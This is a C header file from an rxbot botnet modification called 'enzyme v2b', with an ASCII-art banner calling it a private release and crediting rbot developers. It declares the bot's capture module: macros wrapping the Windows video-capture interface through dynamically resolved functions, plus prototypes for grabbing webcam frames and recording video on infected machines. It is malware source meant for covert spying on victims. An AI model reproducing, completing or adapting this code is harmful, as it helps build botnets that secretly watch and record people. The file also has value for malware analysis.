/*
 XXXXX   XXXXXX   XXXXXXX   XXX XXX XXXXXXX   XXXXX
XXX XXX  XXX XXX  XX  XXX   XXX XXX XXXXXXXX XXX XXX
XXXXXXX  XXX XXX     XXX    XXX XXX XXXXXXXX XXXXXXX
XXX      XXX XXX   XXX      XXX XXX XXXXXXXX XXX
XXX XXX  XXX XXX  XXX  XX    XXXXX  XXXXXXXX XXX XXX
 XXXXX   XXX XXX  XXXXXXX      XXX  XXX  XXX  XXXXX
                              XXX               .v2b
                           XXXXX
 ____________________
+ enzyme ..v2b       +
| nzm rxbot mod ..   |
| private release *  |
| 04.04.05	         |
+____________________+
		      ____________________
 		     + code from ..       +
		     | bcuzz              |
		     | stoney  		      |
		     | x-lock	          |
		     | ionix              |
		     | phatty		      |
		     | nesespray	      |
		     | rbot dev team 	  |
		     +____________________+
 ____________________
+ read ..            +
| the docs           |
| don't ..           |
| mass distribute    |
+____________________+

*/

#ifndef NO_CAPTURE
#define fAVICapSM(hwnd,m,w,l) ( (fIsWindow(hwnd)) ?   fSendMessage(hwnd,m,w,l) : 0)
#define fcapDriverGetCaps(hwnd, s, wSize)	((BOOL)fAVICapSM(hwnd, WM_CAP_DRIVER_GET_CAPS, (WPARAM)(wSize), (LPARAM)(LPVOID)(LPCAPDRIVERCAPS)(s)))
#define fcapDriverConnect(hwnd, i)			((BOOL)fAVICapSM(hwnd, WM_CAP_DRIVER_CONNECT, (WPARAM)(i), 0L))
#define fcapDriverDisconnect(hwnd)			((BOOL)fAVICapSM(hwnd, WM_CAP_DRIVER_DISCONNECT, (WPARAM)0, 0L))
#define fcapGetVideoFormat(hwnd, s, wSize)	((DWORD)fAVICapSM(hwnd, WM_CAP_GET_VIDEOFORMAT, (WPARAM)(wSize), (LPARAM)(LPVOID)(s)))
#define fcapGetVideoFormatSize(hwnd)		((DWORD)fAVICapSM(hwnd, WM_CAP_GET_VIDEOFORMAT, 0, 0L))
#define fcapSetVideoFormat(hwnd, s, wSize)	((BOOL)fAVICapSM(hwnd, WM_CAP_SET_VIDEOFORMAT, (WPARAM)(wSize), (LPARAM)(LPVOID)(s)))
#define fcapGrabFrameNoStop(hwnd)			((BOOL)fAVICapSM(hwnd, WM_CAP_GRAB_FRAME_NOSTOP, (WPARAM)0, (LPARAM)0L))
#define fcapFileSetCaptureFile(hwnd, szName)((BOOL)fAVICapSM(hwnd, WM_CAP_FILE_SET_CAPTURE_FILE, 0, (LPARAM)(LPVOID)(LPTSTR)(szName)))
#define fcapFileSaveDIB(hwnd, szName)		((BOOL)fAVICapSM(hwnd, WM_CAP_FILE_SAVEDIB, 0, (LPARAM)(LPVOID)(LPTSTR)(szName)))
#define fcapCaptureGetSetup(hwnd, s, wSize)	((BOOL)fAVICapSM(hwnd, WM_CAP_GET_SEQUENCE_SETUP, (WPARAM)(wSize), (LPARAM)(LPVOID)(LPCAPTUREPARMS)(s)))
#define fcapCaptureSetSetup(hwnd, s, wSize)	((BOOL)fAVICapSM(hwnd, WM_CAP_SET_SEQUENCE_SETUP, (WPARAM)(wSize), (LPARAM)(LPVOID)(LPCAPTUREPARMS)(s)))
#define fcapCaptureSetSetup(hwnd, s, wSize)	((BOOL)fAVICapSM(hwnd, WM_CAP_SET_SEQUENCE_SETUP, (WPARAM)(wSize), (LPARAM)(LPVOID)(LPCAPTUREPARMS)(s)))
#define fcapCaptureSequence(hwnd)			((BOOL)fAVICapSM(hwnd, WM_CAP_SEQUENCE, (WPARAM)0, (LPARAM)0L))

BOOL Capture(char *file);
int CaptureFrame(char *file, int index, int x, int y);
int CaptureVideo(char *file, int index, int time, int x, int y);
#endif